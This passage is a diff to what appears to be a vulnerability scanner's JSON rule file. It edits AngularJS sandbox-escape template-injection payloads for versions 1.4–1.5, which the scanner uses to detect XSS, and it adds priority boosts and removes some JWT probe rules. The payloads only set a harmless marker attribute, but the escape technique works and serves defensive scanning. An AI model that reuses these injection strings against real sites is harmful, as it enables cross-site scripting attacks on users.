+                "value": "'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,101,118,97,108,45,49,52,48,45,49,52,57))//');",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -4168,14 +4187,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-e-eval-140-149",
-              "payload": "'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,101,118,97,108,45,49,52,48,45,49,52,57),String.fromCharCode(42))//');",
+              "payload": "'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,101,118,97,108,45,49,52,48,45,49,52,57))//');",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.4\\.(?:[0-9])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.4\\.(?:[0-9])\\b|1\\.4\\.(?:[0-9])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.4\\.(?:[0-9])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.4\\.(?:[0-9])\\b",
               "versionRange": "reflected-1-4-0-to-1-4-9",
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "prototype-charat-eval"
+              "payloadFamily": "prototype-charat-eval",
+              "selectorPriorityBoost": 1450
             }
           }
         },
@@ -4209,7 +4229,7 @@
                   "query",
                   "form"
                 ],
-                "value": "{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,53,48,45,49,53,56),String.fromCharCode(42))');}}",
+                "value": "{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,53,48,45,49,53,56))');}}",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -4266,14 +4286,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-r-150-158",
-              "payload": "{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,53,48,45,49,53,56),String.fromCharCode(42))');}}",
+              "payload": "{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,53,48,45,49,53,56))');}}",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.5\\.(?:[0-8])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.5\\.(?:[0-8])\\b|1\\.5\\.(?:[0-8])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.5\\.(?:[0-8])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.5\\.(?:[0-8])\\b",
               "versionRange": "reflected-1-5-0-to-1-5-8",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "prototype-charat-eval"
+              "payloadFamily": "prototype-charat-eval",
+              "selectorPriorityBoost": 1450
             }
           }
         },
@@ -4345,7 +4366,7 @@
                   "query",
                   "form"
                 ],
-                "value": "{y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,49,52,50,45,49,53,56),String.fromCharCode(42))'",
+                "value": "{y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,52,50,45,49,53,56))'",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -4402,14 +4423,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-e-142-158",
-              "payload": "{y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,49,52,50,45,49,53,56),String.fromCharCode(42))'",
+              "payload": "{y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,52,50,45,49,53,56))'",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/(?:1\\.4\\.(?:[2-9])|1\\.5\\.(?:[0-8]))\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}(?:1\\.4\\.(?:[2-9])|1\\.5\\.(?:[0-8]))\\b|(?:1\\.4\\.(?:[2-9])|1\\.5\\.(?:[0-8]))\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.](?:1\\.4\\.(?:[2-9])|1\\.5\\.(?:[0-8]))\\b|angular[/_-][^\\n\\r<>]{0,160}(?:1\\.4\\.(?:[2-9])|1\\.5\\.(?:[0-8]))\\b",
               "versionRange": "expression-1-4-2-to-1-5-8",
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "orderby-prototype-charat"
+              "payloadFamily": "orderby-prototype-charat",
+              "selectorPriorityBoost": 1000
             }
           }
         },
@@ -4507,7 +4529,8 @@
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "constructor-constructor-dom-marker"
+              "payloadFamily": "constructor-constructor-dom-marker",
+              "selectorPriorityBoost": 1320
             }
           }
         },
@@ -4614,7 +4637,8 @@
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "constructor-constructor-alt-delimiters-dom-marker"
+              "payloadFamily": "constructor-constructor-alt-delimiters-dom-marker",
+              "selectorPriorityBoost": 1280
             }
           }
         },
@@ -4750,7 +4774,8 @@
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "constructor-constructor-dom-marker"
+              "payloadFamily": "constructor-constructor-dom-marker",
+              "selectorPriorityBoost": 1320
             }
           }
         }
@@ -5413,64 +5438,6 @@
                           ]
                         }
                       ]
-                    },
-                    {
-                      "and": [
-                        {
-                          "==": [
-                            {
-                              "var": "module.executed.0.metadata.id"
-                            },
-                            "jwt_probe_no_both"
-                          ]
-                        },
-                        {
-                          "or": [
-                            {
-                              "!": {
-                                "==": [
-                                  {
-                                    "var": "module.executed.0.response.statusCode"
-                                  },
-                                  {
-                                    "var": "attack.response.statusCode"
-                                  }
-                                ]
-                              }
-                            },
-                            {
-                              ">": [
-                                {
-                                  "-": [
-                                    {
-                                      "var": "attack.response.length"
-                                    },
-                                    {
-                                      "var": "module.executed.0.response.length"
-                                    }
-                                  ]
-                                },
-                                30
-                              ]
-                            },
-                            {
-                              "<": [
-                                {
-                                  "-": [
-                                    {
-                                      "var": "attack.response.length"
-                                    },
-                                    {
-                                      "var": "module.executed.0.response.length"
-                                    }
-                                  ]
-                                },
-                                -30
-                              ]
-                            }
-                          ]
-                        }
-                      ]
                     }
                   ]
                 }
@@ -5532,8 +5499,7 @@
                     "var": "module.executed"
                   },
                   [
-                    "jwt_probe_no_cookie",
-                    "jwt_probe_no_both"
+                    "jwt_probe_no_cookie"
                   ],
                   {
                     "var": "original.response"
@@ -7323,8 +7289,7 @@
                         "var": "module.executed"
                       },
                       [
-                        "jwt_probe_no_authz",
-                        "jwt_probe_no_both"
+                        "jwt_probe_no_authz"
                       ],
                       {
                         "var": "original.response"
